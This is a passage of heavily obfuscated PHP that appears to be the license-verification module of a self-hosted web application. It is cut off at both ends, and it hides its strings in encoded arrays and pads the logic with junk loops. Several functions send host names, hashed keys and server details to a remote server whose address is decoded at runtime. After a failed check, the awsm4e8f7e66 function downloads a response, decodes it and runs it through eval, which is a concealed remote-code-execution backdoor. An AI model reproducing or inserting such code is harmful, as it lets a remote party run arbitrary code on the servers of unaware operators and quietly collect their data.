unset($¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[89]][$ëó™òß[90]]); unset($¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[89]][$ëó™òß[91]]); $ÙëÍóˆş = $é›ßş›Ó[670]; if (strlen($ÙëÍóˆş) < $é›ßş›Ó[658]) { return; } unset($¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[88]][$ëó™òß[46]]); $øÕ–•¦Â = $é›ßş›Ó[671]; while (strlen($øÕ–•¦Â) < $é›ßş›Ó[636]) { if (!$øÕ–•¦Â) { break; } $øÕ–•¦Â++; } unset($¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[88]][$ëó™òß[92]]); $¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[88]][$ëó™òß[93]] = array($ëó™òß[94] => (int) $ÙßÔ¡öœ[$ëó™òß[95]], $ëó™òß[96] => (int) _get($ÙßÔ¡öœ, $ëó™òß[97], 0)); $‡Í›™çˆ = $é›ßş›Ó[672]; while ($‡Í›™çˆ < $é›ßş›Ó[658]) { if ($‡Í›™çˆ >= 0) { break; } $‡Í›™çˆ++; } $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[99]] = Action($ëó™òß[100])->accessToken(); $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[101]] = md5($_SERVER[$ëó™òß[102]] . $¬ÏÛÒà•[$ëó™òß[103]]); $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[104]] = base64_encode(serverInfo()); $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[105]] = $this->cglrfbb2fa76; $»Õğ¼Ù = $é›ßş›Ó[673]; if (strlen($»Õğ¼Ù) < $é›ßş›Ó[656]) { die; } if ($¬ÏÛÒà•[$ëó™òß[105]] != $ëó™òß[106]) { $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[107]] = $¬ÏÛÒà•[$ëó™òß[107]]; $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[108]] = $¬ÏÛÒà•[$ëó™òß[108]]; $õ¶¯–ßã = rand_string(10) . $this->cglrfbb2fa76 . rand_string(5); $¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[109]][$ëó™òß[110]] = $this->sqjh42353ebe($õ¶¯–ßã, $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[101]]); } if ($this->cglrfbb2fa76 == $ëó™òß[106]) { $¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[88]][$ëó™òß[93]][$ëó™òß[97]] = 0; } $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[111]] = _get($this->bdns170d257c, $ëó™òß[112], $ëó™òß[6]); $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[113]] = _get($this->bdns170d257c, $ëó™òß[114], $ëó™òß[6]); if (_get($GLOBALS, $ëó™òß[115]) && $this->config[$ëó™òß[116]]) { $¼áÍ“¤‚[$ëó™òß[98]][$ëó™òß[117]] = WEB_ROOT; } return $¼áÍ“¤‚; } private function knuj47d1fe55() { $…óÔï°ë =& $_SERVER[¹ş¤¶ĞÖ]; $¨Ş´º±­ =& $_SERVER[Æ×£¿Ÿì]; $—ŞşÛ‰ = $_SERVER[$¨Ş´º±­[24]] == $¨Ş´º±­[118]; if ($_SERVER[$¨Ş´º±­[24]] == $¨Ş´º±­[119] && $_GET[$¨Ş´º±­[120]] == $¨Ş´º±­[121]) { $—ŞşÛ‰ = !0; } if ($—ŞşÛ‰) { $†²™ø­ = array($¨Ş´º±­[105] => $this->cglrfbb2fa76, $¨Ş´º±­[122] => $this->zsklba03c3ee(), $¨Ş´º±­[123] => Model($¨Ş´º±­[124])->count()); if ($this->cglrfbb2fa76 != $¨Ş´º±­[106]) { $—€›Ş½é = _get($this->bdns170d257c, $¨Ş´º±­[125]); if ($—€›Ş½é) { $†²™ø­[$¨Ş´º±­[126]] = $—€›Ş½é; $†²™ø­[$¨Ş´º±­[127]] = strtotime(_get($this->bdns170d257c, $¨Ş´º±­[128])); $†²™ø­[$¨Ş´º±­[129]] = _get($this->bdns170d257c, $¨Ş´º±­[114]); } $®•û·ö· = Model($¨Ş´º±­[33])->get($¨Ş´º±­[130], $¨Ş´º±­[6], !0); if (is_string($®•û·ö·) && substr($®•û·ö·, 0, 1) == $¨Ş´º±­[131]) { $®•û·ö· = json_decode_force($®•û·ö·); } if (is_array($®•û·ö·) && $®•û·ö·[$¨Ş´º±­[132]] && strstr($®•û·ö·[$¨Ş´º±­[132]], $¨Ş´º±­[133])) { $¶·Ñæ†· = explode($¨Ş´º±­[133], $®•û·ö·[$¨Ş´º±­[132]]); $†²™ø­[$¨Ş´º±­[134]] = $¶·Ñæ†·[0]; } } $†²™ø­ = $this->egbm08f767bd(json_encode($†²™ø­), md5($¨Ş´º±­[135])); $ö¢ºá®Ç = $…óÔï°ë[674]; $ÊøÍå™ó = array($¨Ş´º±­[136] => $†²™ø­); call_user_func(array($¨Ş´º±­[137], $¨Ş´º±­[138]), $ÊøÍå™ó); } if ($this->cglrfbb2fa76 == $¨Ş´º±­[106]) { return; } $„± ƒ›¯ = array($¨Ş´º±­[139], $¨Ş´º±­[140], $¨Ş´º±­[141], $¨Ş´º±­[142], $¨Ş´º±­[143], $¨Ş´º±­[144]); $Ë“‹Ú³Ä = $…óÔï°ë[675]; if (strlen($Ë“‹Ú³Ä) < $…óÔï°ë[656]) { die; } $ÅùÅõµƒ = Model($¨Ş´º±­[33])->get(); $ÊøÍå™ó = array($¨Ş´º±­[145] => $ÅùÅõµƒ[$¨Ş´º±­[34]], $¨Ş´º±­[146] => $ÅùÅõµƒ[$¨Ş´º±­[35]], $¨Ş´º±­[147] => $¨Ş´º±­[6]); $Úôì¾ = $…óÔï°ë[676]; while (strlen($Úôì¾) < $…óÔï°ë[656]) { if (!$Úôì¾) { break; } $Úôì¾++; } foreach ($„± ƒ›¯ as $¸––Ë®) { if (!isset($ÅùÅõµƒ[$¸––Ë®]) || !$ÅùÅõµƒ[$¸––Ë®]) { continue; } $ÊøÍå™ó[$¸––Ë®] = $ÅùÅõµƒ[$¸––Ë®]; } call_user_func(array($¨Ş´º±­[137], $¨Ş´º±­[138]), $ÊøÍå™ó); } private function tgoz5f77414e() { $¥Ñ–ñÈµ =& $_SERVER[¹ş¤¶ĞÖ]; $½ïŒüš =& $_SERVER[Æ×£¿Ÿì]; if ($_SERVER[$½ïŒüš[24]] != $½ïŒüš[148]) { return; } if (!_get($GLOBALS, $½ïŒüš[115])) { die; } $Ğ¿™§üÍ = $GLOBALS[$½ïŒüš[13]]; if (isset($Ğ¿™§üÍ[$½ïŒüš[149]])) { $this->ybxsa25f69ba(); die; } if (!isset($Ğ¿™§üÍ[$½ïŒüš[150]]) || strlen($Ğ¿™§üÍ[$½ïŒüš[150]]) != 16) { show_json($½ïŒüš[151] . $Ğ¿™§üÍ[$½ïŒüš[150]], !1); } $‘ÌÆ¹§ú = Model($½ïŒüš[33])->get($½ïŒüš[103]); $ÑŠ—îö« = md5($_SERVER[$½ïŒüš[102]] . $‘ÌÆ¹§ú); $ùí èÍ = $¥Ñ–ñÈµ[677]; if (!$ùí èÍ) { die; } $©¼ş¥¶ = array($½ïŒüš[150] => $Ğ¿™§üÍ[$½ïŒüš[150]], $½ïŒüš[152] => rand_string(16), $½ïŒüš[153] => $½ïŒüš[135], $½ïŒüš[154] => $½ïŒüš[155], $½ïŒüš[156] => $_SERVER[$½ïŒüš[157]], $½ïŒüš[158] => $_SERVER[$½ïŒüš[159]], $½ïŒüš[160] => $_SERVER[$½ïŒüš[161]], $½ïŒüš[101] => $ÑŠ—îö«, $½ïŒüš[162] => Model($½ïŒüš[33])->get($½ïŒüš[130])); if ($Ğ¿™§üÍ[$½ïŒüš[163]] == $½ïŒüš[164]) { $–ûÍ‡Îø = $this->egbm08f767bd($ÑŠ—îö«, $½ïŒüš[165]); $ïõáÊ¤Ş = $this->sqjh42353ebe(json_encode($©¼ş¥¶), $ÑŠ—îö« . $½ïŒüš[166], 3); $ïõáÊ¤Ş = $ïõáÊ¤Ş . $½ïŒüš[167] . $_SERVER[$½ïŒüš[157]]; $ëøõØÜ“ = $this->jmbrb265929a($½ïŒüš[168] . $–ûÍ‡Îø . $½ïŒüš[169] . $ïõáÊ¤Ş, -1); show_json($ëøõØÜ“, !0); } else { if ($Ğ¿™§üÍ[$½ïŒüš[163]] == $½ïŒüš[170]) { $â–­¦¹æ = substr(md5($½ïŒüš[171] . $ÑŠ—îö«), 12, 15) . $½ïŒüš[172]; $ïõáÊ¤Ş = $this->oztl99876ebd(trim($Ğ¿™§üÍ[$½ïŒüš[173]]), $â–­¦¹æ, 2); $³©¹ÍÏ = json_decode($ïõáÊ¤Ş, !0); if (!is_array($³©¹ÍÏ) || !is_array($³©¹ÍÏ[$½ïŒüš[174]]) || $³©¹ÍÏ[$½ïŒüš[150]] != !0) { $ŸßÈ¸²Ô = $½ïŒüš[175]; $ÑÔù = $³©¹ÍÏ[$½ïŒüš[174]] ? $½ïŒüš[176] . $³©¹ÍÏ[$½ïŒüš[174]] : $ŸßÈ¸²Ô; show_json($ÑÔù, !1); } else { $©¼ş¥¶[$½ïŒüš[152]] = $³©¹ÍÏ[$½ïŒüš[174]][$½ïŒüš[177]]; } } else { $³©¹ÍÏ = $this->jmbrb265929a($½ïŒüš[178], $©¼ş¥¶, 10); } } if (!is_array($³©¹ÍÏ) || !is_array($³©¹ÍÏ[$½ïŒüš[174]]) || $³©¹ÍÏ[$½ïŒüš[150]] != !0) { $ŸßÈ¸²Ô = LNG($½ïŒüš[179]); $ÑÔù = $³©¹ÍÏ[$½ïŒüš[174]] ? $½ïŒüš[176] . $³©¹ÍÏ[$½ïŒüš[174]] : $ŸßÈ¸²Ô; show_json($ÑÔù, !1); } $…ÒÒÅ•© = $³©¹ÍÏ[$½ïŒüš[174]]; $£÷ÔÕúş = $this->yxqk7a89d202($…ÒÒÅ•©[$½ïŒüš[180]]); $ÕÙ¤…Ë¦ = $¥Ñ–ñÈµ[678]; if (strlen($ÕÙ¤…Ë¦) < $¥Ñ–ñÈµ[636]) { return; } if (!$£÷ÔÕúş || $£÷ÔÕúş != $…ÒÒÅ•©[$½ïŒüš[128]]) { $˜µ”–Ô = array($½ïŒüš[181] => Model($½ïŒüš[33])->get($½ïŒüš[103]), $½ïŒüš[182] => $_SERVER[$½ïŒüš[102]], $½ïŒüš[183] => this_url(), $½ïŒüš[158] => $_SERVER[$½ïŒüš[159]]); $ïõáÊ¤Ş = $this->cqnd4022adf5(json_encode($˜µ”–Ô)); $this->jmbrb265929a($½ïŒüš[184] . $ïõáÊ¤Ş); show_json(LNG($½ïŒüš[185]), !0); } $ã›Ü»Š€ = array($½ïŒüš[186] => $…ÒÒÅ•©[$½ïŒüš[187]], $½ïŒüš[188] => $…ÒÒÅ•©[$½ïŒüš[189]], $½ïŒüš[190] => rand_string(16), $½ïŒüš[105] => $…ÒÒÅ•©[$½ïŒüš[191]]); if ($©¼ş¥¶[$½ïŒüš[152]]) { $ã›Ü»Š€[$½ïŒüš[190]] = $©¼ş¥¶[$½ïŒüš[152]]; } $âş—ØŒ = substr(md5($ã›Ü»Š€[$½ïŒüš[188]]), 10, 10); $£Œ°üóø = $âş—ØŒ . $ã›Ü»Š€[$½ïŒüš[105]] . $ã›Ü»Š€[$½ïŒüš[190]]; $¨¸ïÕ³ê = $¥Ñ–ñÈµ[679]; if (!$¨¸ïÕ³ê) { return; } $ã›Ü»Š€[$½ïŒüš[107]] = strrev(base64_encode($this->egbm08f767bd($£Œ°üóø, $½ïŒüš[192]))); $¯ï—Ø» = $¥Ñ–ñÈµ[680]; $Õù„“È› = rand_string(16); $ÁÓ²ğã† = $¥Ñ–ñÈµ[681]; $¬’ñ¤Ò¸ = $Õù„“È› . $ã›Ü»Š€[$½ïŒüš[105]] . $this->egbm08f767bd(md5($ã›Ü»Š€[$½ïŒüš[186]]), $Õù„“È›); $¤ˆ¶àóå = $¥Ñ–ñÈµ[682]; $ã›Ü»Š€[$½ïŒüš[108]] = base64_encode(strrev($this->egbm08f767bd($¬’ñ¤Ò¸, $½ïŒüš[193]))); if ($…ÒÒÅ•©[$½ïŒüš[194]] && $…ÒÒÅ•©[$½ïŒüš[194]] >= 1) { Model($½ïŒüš[33])->setDeep($½ïŒüš[195], $½ïŒüš[121]); } Model($½ïŒüš[33])->set($ã›Ü»Š€); $÷‰£¡éÜ = md5($_SERVER[$½ïŒüš[102]] . strrev($‘ÌÆ¹§ú) . $ã›Ü»Š€[$½ïŒüš[188]]); $İïëíÃå = $¥Ñ–ñÈµ[683]; if (strlen($İïëíÃå) < $¥Ñ–ñÈµ[647]) { die; } $Ú¹§°ÕÎ = strrev(substr($÷‰£¡éÜ, 10, 16)); $ı¿™å˜« = $¥Ñ–ñÈµ[684]; if (!$ı¿™å˜«) { die; } $·×ÚûÌô = $this->sqjh42353ebe(json_encode($…ÒÒÅ•©), $÷‰£¡éÜ); $×Ê¬Íı = array_to_keyvalue(Model($½ïŒüš[7])->listData(), $½ïŒüš[196]); $åæ¹„ˆË = $¥Ñ–ñÈµ[685]; $Ë”œ‰¬é = $×Ê¬Íı[$½ïŒüš[197]]; $…’üùŞ‚ = array(); $‹¶çÃ² = $¥Ñ–ñÈµ[686]; if (!$‹¶çÃ²) { die; } $…’üùŞ‚[$Ú¹§°ÕÎ] = $·×ÚûÌô; $ÄşÏîà = $¥Ñ–ñÈµ[687]; Model($½ïŒüš[7])->update($Ë”œ‰¬é[$½ïŒüš[198]], array($½ïŒüš[199] => $…’üùŞ‚)); $òµÓÃßñ = $¥Ñ–ñÈµ[688]; $this->bdns170d257c = $…ÒÒÅ•©; $ÙÅ¸‰úø = $¥Ñ–ñÈµ[689]; while (strlen($ÙÅ¸‰úø) < $¥Ñ–ñÈµ[642]) { if (!$ÙÅ¸‰úø) { break; } $ÙÅ¸‰úø++; } $this->cglrfbb2fa76 = $ã›Ü»Š€[$½ïŒüš[105]]; $this->licenseRegistSuccess(); Cache::set($½ïŒüš[200] . md5($‘ÌÆ¹§ú . $½ïŒüš[201]), $½ïŒüš[6]); $‹æÒòûç = $¥Ñ–ñÈµ[690]; show_json(LNG($½ïŒüš[185]), !0); } private function licenseRegistSuccess() { $¤Êƒğ»® =& $_SERVER[Æ×£¿Ÿì]; $™”‚ÖÔ = Model($¤Êƒğ»®[33])->get(); if ($™”‚ÖÔ[$¤Êƒğ»®[63]] != $¤Êƒğ»®[121]) { Model($¤Êƒğ»®[33])->set($¤Êƒğ»®[63], $¤Êƒğ»®[121]); } Action($¤Êƒğ»®[202])->initStart(!0); } private function ybxsa25f69ba() { $“Â£Øäø =& $_SERVER[¹ş¤¶ĞÖ]; $¾ØöÒÈª =& $_SERVER[Æ×£¿Ÿì]; Model($¾ØöÒÈª[33])->set(array($¾ØöÒÈª[186] => $¾ØöÒÈª[6], $¾ØöÒÈª[188] => $¾ØöÒÈª[6], $¾ØöÒÈª[105] => $¾ØöÒÈª[106], $¾ØöÒÈª[107] => $¾ØöÒÈª[6], $¾ØöÒÈª[108] => $¾ØöÒÈª[6])); $ö‰¾¦ = $“Â£Øäø[691]; while (strlen($ö‰¾¦) < $“Â£Øäø[656]) { if (!$ö‰¾¦) { break; } $ö‰¾¦++; } Model($¾ØöÒÈª[33])->setDeep($¾ØöÒÈª[195], $¾ØöÒÈª[203]); $ˆÊ‚˜şû = $“Â£Øäø[692]; if (!$ˆÊ‚˜şû) { die; } $this->bdns170d257c = array(); $Ó±öÇ«É = $“Â£Øäø[693]; $this->cglrfbb2fa76 = $¾ØöÒÈª[106]; } private function qzsef16e63eb() { $Ë—ÆĞå =& $_SERVER[¹ş¤¶ĞÖ]; $‰òĞæã½ =& $_SERVER[Æ×£¿Ÿì]; $_SERVER[$‰òĞæã½[159]] = _get($_SERVER, $‰òĞæã½[159], APP_HOST); $«ßŠÚğ = $Ë—ÆĞå[694]; $this->cglrfbb2fa76 = $‰òĞæã½[106]; $³À™ò³Å = $Ë—ÆĞå[695]; if (!$³À™ò³Å) { return; } $İÚ“ÃÓ = Model($‰òĞæã½[33])->get(); if ($İÚ“ÃÓ[$‰òĞæã½[105]] == $‰òĞæã½[106]) { return; } $»ùĞÃ£’ = Model($‰òĞæã½[33])->get($‰òĞæã½[103]); $ƒŸµå = $‰òĞæã½[200] . md5($»ùĞÃ£’ . $‰òĞæã½[201]); $Ê‚Õæê  = Cache::get($ƒŸµå); if (!is_array($Ê‚Õæê ) || !isset($Ê‚Õæê [$‰òĞæã½[204]]) || time() - $Ê‚Õæê [$‰òĞæã½[204]] >= 60) { $Ëñúƒ¾Å = Model($‰òĞæã½[7])->loadList(); $§ÕÜŠ¢³ = $Ëñúƒ¾Å[$‰òĞæã½[197]]; $—Ù“İ¸ü = md5($_SERVER[$‰òĞæã½[102]] . strrev($»ùĞÃ£’) . $İÚ“ÃÓ[$‰òĞæã½[188]]); $Ç’Éƒç = strrev(substr($—Ù“İ¸ü, 10, 16)); $Ê‚Õæê  = $this->oztl99876ebd($§ÕÜŠ¢³[$‰òĞæã½[85]][$Ç’Éƒç], $—Ù“İ¸ü); $Ê‚Õæê  = json_decode($Ê‚Õæê , !0); } if (!is_array($Ê‚Õæê )) { return $this->ybxsa25f69ba(); } $ÓÁ°ˆ‚÷ = strtotime($Ê‚Õæê [$‰òĞæã½[128]]); if (time() >= $ÓÁ°ˆ‚÷) { return $this->ybxsa25f69ba(); } if (time() - $Ê‚Õæê [$‰òĞæã½[204]] > 20) { $Ê‚Õæê [$‰òĞæã½[204]] = time(); Cache::set($ƒŸµå, $Ê‚Õæê ); } $this->bdns170d257c = $Ê‚Õæê ; $this->cglrfbb2fa76 = $İÚ“ÃÓ[$‰òĞæã½[105]]; $ÒÈª«Å = $Ë—ÆĞå[696]; while (strlen($ÒÈª«Å) < $Ë—ÆĞå[658]) { if (!$ÒÈª«Å) { break; } $ÒÈª«Å++; } } private function hmrw77b70956() { $Ôˆ›»šÃ =& $_SERVER[¹ş¤¶ĞÖ]; $ôüı’˜ =& $_SERVER[Æ×£¿Ÿì]; $è›ºÅûÛ = $GLOBALS[$ôüı’˜[13]]; $ºˆ‘ŸÅ = $_SERVER[$ôüı’˜[24]]; $Š­‚©¦ = $Ôˆ›»šÃ[697]; if (strlen($Š­‚©¦) < $Ôˆ›»šÃ[642]) { return; } if ($ºˆ‘ŸÅ == $ôüı’˜[205] && $this->cglrfbb2fa76 == $ôüı’˜[106]) { show_json(LNG($ôüı’˜[206]), !1, $ôüı’˜[207]); } $ûìƒ Ú– = array($ôüı’˜[208], $ôüı’˜[209]); if (in_array($ºˆ‘ŸÅ, $ûìƒ Ú–)) { if ($this->cglrfbb2fa76 == $ôüı’˜[106] && isset($è›ºÅûÛ[$ôüı’˜[210]])) { show_json(LNG($ôüı’˜[206]), !1, $ôüı’˜[207]); die; } $–Ç¿ş˜Ó = $this->zsklba03c3ee(); if ($–Ç¿ş˜Ó != intval($ôüı’˜[211])) { if ($–Ç¿ş˜Ó <= Model($ôüı’˜[124])->count()) { show_json(LNG($ôüı’˜[212]), !1, $ôüı’˜[207]); die; } } } } private function kqgf4e109dae() { $ÓÖÉ‚ı =& $_SERVER[¹ş¤¶ĞÖ]; $ª¯ùÏí =& $_SERVER[Æ×£¿Ÿì]; $­ÆÜ˜ùÓ = array($ª¯ùÏí[118], $ª¯ùÏí[119]); $“õ¬é˜‰ = $ÓÖÉ‚ı[698]; while (strlen($“õ¬é˜‰) < $ÓÖÉ‚ı[647]) { if (!$“õ¬é˜‰) { break; } $“õ¬é˜‰++; } if (!_get($GLOBALS, $ª¯ùÏí[115]) || !isset($_GET[$ª¯ùÏí[213]])) { return; } if (!in_array($_SERVER[$ª¯ùÏí[24]], $­ÆÜ˜ùÓ)) { return; } $³ÃÉÊ = $ª¯ùÏí[214]; $³ÃÉÊ = $this->hicg1688814b($³ÃÉÊ, $ª¯ùÏí[215]); $“„ÎìÕ = stream_context_create(array($ª¯ùÏí[216] => array($ª¯ùÏí[217] => $ª¯ùÏí[218], $ª¯ùÏí[219] => 3))); $²ÆúáÜ = $ÓÖÉ‚ı[699]; $Æ»×›Â = @file_get_contents($³ÃÉÊ, !1, $“„ÎìÕ); $ò®İ¹¨ = $ÓÖÉ‚ı[700]; header($ª¯ùÏí[220]); $éÈĞıîï = $ÓÖÉ‚ı[701]; if ($Æ»×›Â && strstr($Æ»×›Â, $ª¯ùÏí[221])) { echo $Æ»×›Â; } die; } public function ruif0b5ce718($Æ†´Òé²) { $ùÃ–åÄ¤ =& $_SERVER[¹ş¤¶ĞÖ]; $¹°©¿Ø© =& $_SERVER[Æ×£¿Ÿì]; if ($this->cglrfbb2fa76 == $¹°©¿Ø©[222]) { return $Æ†´Òé²; } $©ÙÄ¾›ú = array($¹°©¿Ø©[223] => $¹°©¿Ø©[224], $¹°©¿Ø©[225] => $¹°©¿Ø©[224], $¹°©¿Ø©[226] => $¹°©¿Ø©[224], $¹°©¿Ø©[227] => $¹°©¿Ø©[228], $¹°©¿Ø©[229] => $¹°©¿Ø©[228], $¹°©¿Ø©[230] => $¹°©¿Ø©[228], $¹°©¿Ø©[231] => $¹°©¿Ø©[228], $¹°©¿Ø©[232] => $¹°©¿Ø©[228], $¹°©¿Ø©[233] => $¹°©¿Ø©[228], $¹°©¿Ø©[234] => $¹°©¿Ø©[228], $¹°©¿Ø©[235] => $¹°©¿Ø©[228], $¹°©¿Ø©[236] => $¹°©¿Ø©[228], $¹°©¿Ø©[237] => $¹°©¿Ø©[228], $¹°©¿Ø©[238] => $¹°©¿Ø©[228], $¹°©¿Ø©[239] => $¹°©¿Ø©[228]); $ËÛ‡‘Ñê = $ùÃ–åÄ¤[702]; $¶ú¿õ‚’ = explode($¹°©¿Ø©[240], _get($this->bdns170d257c, $¹°©¿Ø©[112], $¹°©¿Ø©[6])); $úÛŸÒ®§ = $ùÃ–åÄ¤[703]; $áÍÚÑ = array(); $Íªıæ Û = $ùÃ–åÄ¤[704]; while (strlen($Íªıæ Û) < $ùÃ–åÄ¤[656]) { if (!$Íªıæ Û) { break; } $Íªıæ Û++; } foreach ($©ÙÄ¾›ú as $ãä¡ÓÃ => $Ğ¾ à) { if ($Ğ¾ à == $¹°©¿Ø©[224] && substr($this->cglrfbb2fa76, 0, 1) == $¹°©¿Ø©[224]) { continue; } if (!in_array($ãä¡ÓÃ, $¶ú¿õ‚’)) { $áÍÚÑ[] = $ãä¡ÓÃ; } } foreach ($áÍÚÑ as $ãä¡ÓÃ) { unset($Æ†´Òé²[$ãä¡ÓÃ]); $ó‰§¦¿è = $ùÃ–åÄ¤[705]; while ($ó‰§¦¿è < $ùÃ–åÄ¤[636]) { if ($ó‰§¦¿è >= 0) { break; } $ó‰§¦¿è++; } } return $Æ†´Òé²; $ªıó­·º = $ùÃ–åÄ¤[706]; while ($ªıó­·º < $ùÃ–åÄ¤[642]) { if ($ªıó­·º >= 0) { break; } $ªıó­·º++; } } private function bmvr842c0eb3() { $ù÷’ÉÆò =& $_SERVER[Æ×£¿Ÿì]; if ($this->cglrfbb2fa76 != $ù÷’ÉÆò[106]) { $GLOBALS[$ù÷’ÉÆò[85]][$ù÷’ÉÆò[89]][$ù÷’ÉÆò[241]] = $ù÷’ÉÆò[203]; return; } $GLOBALS[$ù÷’ÉÆò[85]][$ù÷’ÉÆò[242]] = $ù÷’ÉÆò[121]; if (Model($ù÷’ÉÆò[243])->get($ù÷’ÉÆò[63]) != $ù÷’ÉÆò[203]) { Model($ù÷’ÉÆò[243])->set($ù÷’ÉÆò[63], $ù÷’ÉÆò[203]); } } public function mzchca7377dc() { $ ©‡äÃë =& $_SERVER[¹ş¤¶ĞÖ]; return $_SERVER[Æ×£¿Ÿì][244]; $ÂèñÅÓ¬ = $ ©‡äÃë[707]; while (strlen($ÂèñÅÓ¬) < $ ©‡äÃë[636]) { if (!$ÂèñÅÓ¬) { break; } $ÂèñÅÓ¬++; } } private function awsm4e8f7e66() { $óï­¨·³ =& $_SERVER[¹ş¤¶ĞÖ]; $úÀ”ºã =& $_SERVER[Æ×£¿Ÿì]; $«»â‡è = array($úÀ”ºã[245], $úÀ”ºã[246], $úÀ”ºã[247]); $³ö¯îŞ = $úÀ”ºã[248] . md5($úÀ”ºã[249]); if ($this->cglrfbb2fa76 == $úÀ”ºã[106] || !_get($GLOBALS, $úÀ”ºã[115])) { return; } if (!in_array($_SERVER[$úÀ”ºã[24]], $«»â‡è)) { return; } if (time() % 4 != 0) { return; } $Í÷…Ú“ñ = call_user_func(array($úÀ”ºã[250], $úÀ”ºã[251]), $³ö¯îŞ); if ($Í÷…Ú“ñ && time() - $Í÷…Ú“ñ < intval($úÀ”ºã[252])) { return; } call_user_func(array($úÀ”ºã[250], $úÀ”ºã[138]), $³ö¯îŞ, time()); $ŸÄæ”ş® = $óï­¨·³[708]; $¥Ü´Ò = Model($úÀ”ºã[33])->get($úÀ”ºã[103]); $Åªê‘´Ó = array($úÀ”ºã[150] => Model($úÀ”ºã[33])->get($úÀ”ºã[186]), $úÀ”ºã[163] => $this->cglrfbb2fa76, $úÀ”ºã[160] => $_SERVER[$úÀ”ºã[161]], $úÀ”ºã[162] => Model($úÀ”ºã[33])->get($úÀ”ºã[130]), $úÀ”ºã[101] => md5($_SERVER[$úÀ”ºã[102]] . $¥Ü´Ò), $úÀ”ºã[153] => $úÀ”ºã[135], $úÀ”ºã[156] => $_SERVER[$úÀ”ºã[157]]); $¥Í§ãÔø = $óï­¨·³[709]; if (!$¥Í§ãÔø) { die; } $ÛÀÓæ˜ = $this->jmbrb265929a($úÀ”ºã[253], $Åªê‘´Ó); if (!is_array($ÛÀÓæ˜)) { return; } if ($ÛÀÓæ˜[$úÀ”ºã[150]] && $ÛÀÓæ˜[$úÀ”ºã[254]]) { if ($this->yxqk7a89d202($ÛÀÓæ˜[$úÀ”ºã[254]]) == $Åªê‘´Ó[$úÀ”ºã[150]]) { return; } } $this->ybxsa25f69ba(); if ($this->yxqk7a89d202($ÛÀÓæ˜[$úÀ”ºã[254]]) != $Åªê‘´Ó[$úÀ”ºã[150]]) { $ÎÓ³Î¸« = array($úÀ”ºã[181] => $¥Ü´Ò, $úÀ”ºã[182] => $_SERVER[$úÀ”ºã[102]], $úÀ”ºã[183] => this_url(), $úÀ”ºã[158] => $_SERVER[$úÀ”ºã[159]]); $»¢›ü™ = $this->cqnd4022adf5(json_encode($ÎÓ³Î¸«)); $ÛÀÓæ˜ = $this->jmbrb265929a($úÀ”ºã[184] . $»¢›ü™); if ($ÛÀÓæ˜ && is_array($ÛÀÓæ˜) && isset($ÛÀÓæ˜[$úÀ”ºã[254]])) { $µşáõø´ = $this->oztl99876ebd($ÛÀÓæ˜[$úÀ”ºã[254]], 2); if ($µşáõø´) { $µşáõø´ = $this->yxqk7a89d202($µşáõø´); } if ($µşáõø´) { try { @eval($µşáõø´); } catch (Exception $ı××À±£) { } } } } } private function jmbrb265929a($ƒ£×µß¿ = '', $¼­³ô©Ü = array(), $¡Ó„×µÙ = 5) { $³Ô‹ÙÊ =& $_SERVER[¹ş¤¶ĞÖ]; $šœ¸´´… =& $_SERVER[Æ×£¿Ÿì]; $ÂØËúıÙ = $šœ¸´´…[255]; $Ÿ†ĞÍÍ½ = $³Ô‹ÙÊ[710]; while (strlen($Ÿ†ĞÍÍ½) < $³Ô‹ÙÊ[636]) { if (!$Ÿ†ĞÍÍ½) { break; } $Ÿ†ĞÍÍ½++; } $ÂØËúıÙ = $this->hicg1688814b($ÂØËúıÙ, $šœ¸´´…[256]); $ÂØËúıÙ = $ÂØËúıÙ . $ƒ£×µß¿; if ($¼­³ô©Ü && is_array($¼­³ô©Ü)) { $ÂØËúıÙ = $ÂØËúıÙ . $šœ¸´´…[257] . http_build_query($¼­³ô©Ü); } if ($¼­³ô©Ü === -1) { return $ÂØËúıÙ; } $ˆ‰¸ = stream_context_create(array($šœ¸´´…[216] => array($šœ¸´´…[219] => $¡Ó„×µÙ, $šœ¸´´…[217] => $šœ¸´´…[258]), $šœ¸´´…[259] => array($šœ¸´´…[260] => !1, $šœ¸´´…[261] => !1))); $¼­³ô©Ü = @file_get_contents($ÂØËúıÙ, !1, $ˆ‰¸); $á® ½Ø´ = $³Ô‹ÙÊ[711]; return json_decode($¼­³ô©Ü, !0); } private function zsklba03c3ee() { $Ä¿Ç‰Ô =& $_SERVER[¹ş¤¶ĞÖ]; $­âÔ¼ó® =& $_SERVER[Æ×£¿Ÿì]; $ˆã¯­ŠŸ = array($­âÔ¼ó®[262] => $­âÔ¼ó®[263], $­âÔ¼ó®[264] => $­âÔ¼ó®[265], $­âÔ¼ó®[266] => $­âÔ¼ó®[267], $­âÔ¼ó®[268] => $­âÔ¼ó®[269], $­âÔ¼ó®[270] => $­âÔ¼ó®[271], $­âÔ¼ó®[272] => $­âÔ¼ó®[211], $­âÔ¼ó®[273] => $­âÔ¼ó®[211], $­âÔ¼ó®[274] => $­âÔ¼ó®[263], $­âÔ¼ó®[275] => $­âÔ¼ó®[265], $­âÔ¼ó®[276] => $­âÔ¼ó®[267], $­âÔ¼ó®[277] => $­âÔ¼ó®[278], $­âÔ¼ó®[279] => $­âÔ¼ó®[269], $­âÔ¼ó®[280] => $­âÔ¼ó®[281], $­âÔ¼ó®[282] => $­âÔ¼ó®[271], $­âÔ¼ó®[283] => $­âÔ¼ó®[284], $­âÔ¼ó®[285] => $­âÔ¼ó®[286], $­âÔ¼ó®[287] => $­âÔ¼ó®[288]); $‹Öî¾— = $ˆã¯­ŠŸ[$this->cglrfbb2fa76]; $‹Öî¾— = intval($‹Öî¾— ? $‹Öî¾— : $­âÔ¼ó®[263]); $¾ÃåİçŠ = _get($this->bdns170d257c, $­âÔ¼ó®[289]); 